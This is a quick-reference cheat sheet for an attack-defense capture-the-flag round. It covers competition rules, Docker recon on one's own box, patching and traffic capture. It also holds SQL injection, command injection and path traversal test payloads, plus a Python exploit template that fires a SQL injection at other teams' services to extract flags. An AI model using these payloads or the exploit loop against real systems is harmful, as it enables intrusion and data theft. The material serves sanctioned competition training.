# A/D CTF Command Cheat Sheet

Quick reference for the Attack-Defense round. Tuned for the docker pwnbox setup and the competition rules. Replace `TARGET`, `PORT`, container names and the flag format with the real values from README on game day.

## Rules — don't get disqualified

- No scanning enemies (no nmap, directory brute-force, probing) — targets are provided
- Add a delay of **2 seconds or more** in any attack loop (no flooding)
- Defend by **patching code only** — no firewall rules / IP blocking
- Never crash or DoS another team's service — steal the flag gently
- Capture traffic on **your own box only**

## 1. Read this first (on game day)
```
cat README.txt          # flag format, submission, services, IPs — READ IT FIRST
cd /team                # your team's shared folder (share exploits here)
```

## 2. Recon — on YOUR OWN box only (allowed)
Every box is identical, so your ports = everyone's ports. Never scan enemies.
```
docker ps               # running service containers + their ports  <- main one
docker ps -a            # include stopped containers
ss -tlnp                # listening TCP ports + process
ss -tulnp               # include UDP
netstat -tlnp           # older equivalent
ps aux                  # running processes
```

## 3. Get inside a service (to read code / patch)
```
docker exec -it <name> bash     # shell inside the container
docker inspect <name>           # config, mounts, env, ports
docker cp <name>:/app ./app     # copy service files out to look at them
find / -name '*.py' 2>/dev/null # locate source files inside a container
```

## 4. Attack — manual web testing (curl)
```
curl http://TARGET:PORT/path
curl -s "http://TARGET:PORT/search?q=test"
curl -X POST -d "user=admin&pass=x" http://TARGET:PORT/login
curl -i http://TARGET:PORT/            # include response headers
```

Common test payloads:
```
SQLi:              ' OR '1'='1       |   ' OR 1=1-- -
Command injection: ; id   |   | id   |   $(id)   |   `id`
Path traversal:    ../../../../etc/passwd
```

## 5. Attack — Python exploit template
Save as `exploit.py`. It must take a target and print the flag(s) to stdout (DestructiveFarm reads stdout).
```python
#!/usr/bin/env python3
import sys, re, requests

TARGET = sys.argv[1]            # enemy IP (DestructiveFarm passes this)
PORT   = "10001"               # service port (from your own docker ps)
URL    = f"http://{TARGET}:{PORT}"

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")   # <-- set to the real flag format from README

def exploit():
    # --- put your attack here ---
    r = requests.get(f"{URL}/search",
                     params={"q": "' OR 1=1-- -"},
                     timeout=5)
    return FLAG_RE.findall(r.text)

if __name__ == "__main__":
    for flag in exploit():
        print(flag)
```

Run it by hand:
```
python3 exploit.py 10.0.0.5
```

## 6. Automate — DestructiveFarm
```
git clone https://github.com/DestructiveVoice/DestructiveFarm
# edit server/config.py:
#   TEAMS       = { 'team5': '10.0.0.5', ... }   enemy IPs
#   FLAG_FORMAT = r'FLAG\{[^}]+\}'
#   SUBMIT_...   = organizer's submission endpoint (from README)
#   submit period / delay  >= 2s   (rules!)
# put exploit.py in the exploits folder, point the farm at it, start it
```

## 7. Defend — patch the code
```
docker exec -it <name> bash     # go in
# edit the vulnerable file (nano / vi), fix the bug:
#   SQLi    -> parameterized queries / escape input
#   cmd inj -> remove shell call / whitelist input
#   path trav -> block ../ , resolve to a safe base dir
exit
docker restart <name>           # restart so the fix loads
# or if compose-based:
docker compose up -d --build <name>
```

Then confirm the service still works (checker must pass = SLA points).

## 8. Monitor — your own traffic only
```
sudo tcpdump -i any -w cap.pcap port 10001    # capture attacks on your service
sudo tcpdump -i any -A port 10001             # live, show ascii
tcpdump -r cap.pcap -A                         # read it back
```

Open `cap.pcap` in Wireshark -> Follow TCP Stream to see an enemy's exploit -> copy it back at them.

## tmux (keep things running)
```
tmux new -s ad        # start a session
Ctrl+b  d             # detach (leaves it running)
tmux attach -t ad     # come back
Ctrl+b  "             # split pane horizontal
Ctrl+b  %             # split pane vertical
```
